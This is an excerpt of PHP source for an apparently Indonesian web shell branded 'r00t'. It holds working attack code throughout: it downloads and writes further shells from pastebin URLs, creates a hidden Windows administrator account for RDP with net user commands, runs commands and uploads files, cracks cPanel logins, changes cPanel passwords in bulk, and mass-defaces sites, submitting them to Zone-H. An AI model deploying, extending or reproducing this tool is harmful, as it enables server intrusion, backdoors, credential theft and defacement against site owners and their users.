...
$password = "27db7898211c8ccbeb4d5a97d198839a"; # md5: r00t
...
// Tapi Selebihnya, itu hasil kreasi r00t sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member r00t. & All My Friends.
###############################################################################
// Special Thanks: Siantar Cyber Security | Sanjungan Jiwa | 0x1999 | r00t
###############################################################################
-->
<head>
<title>r00t</title>
...
function getfile($name) {
	...
	elseif($name === "webconsole") $get = array("https://pastebin.com/raw/BGrZxEDf", "webconsole.php");
	elseif($name === "cgitelnet1") $get = array("https://pastebin.com/raw/wJhiL8Tn", "idx_cgi/cgitelnet1.idx");
	elseif($name === "cgitelnet2") $get = array("https://pastebin.com/raw/kiXUP45t", "idx_cgi/cgitelnet2.idx");
	elseif($name === "LRE") $get = array("https://pastebin.com/raw/XzY9DDLv", "r00t.php");
	$fp = fopen($get[1], "w");
	$ch = curl_init();
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/r00t/", exe("net user"))) die(color(1, 1, "[INFO] username 'r00t' already exists."));
		$add_user   = exe("net user r00t r00t /add");
    	$add_groups1 = exe("net localgroup Administrators r00t /add");
    	$add_groups2 = exe("net localgroup Administrator r00t /add");
    	$add_groups3 = exe("net localgroup Administrateur r00t /add");
    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "r00t")."<br>
    	Password: ".color(1, 2, "r00t")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://r00t.or.id/' target='_blank'>".color(1, 2, "r00t")."</a></center>";
}
function action() {
	tools("upload");
	tools("cmd");
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='r00t'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by r00t")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='r00t' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='r00t' placeholder='pass_baru'><br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by r00t</textarea><br>
		...
		elseif($_GET['do'] === 'lre') {
			if(file_exists("r00t.php")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/r00t.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'r00t'."));
				if(getfile("LRE")) {
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/r00t.php' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file r00t.");
					@unlink("r00t.php");
				}
			}
		}
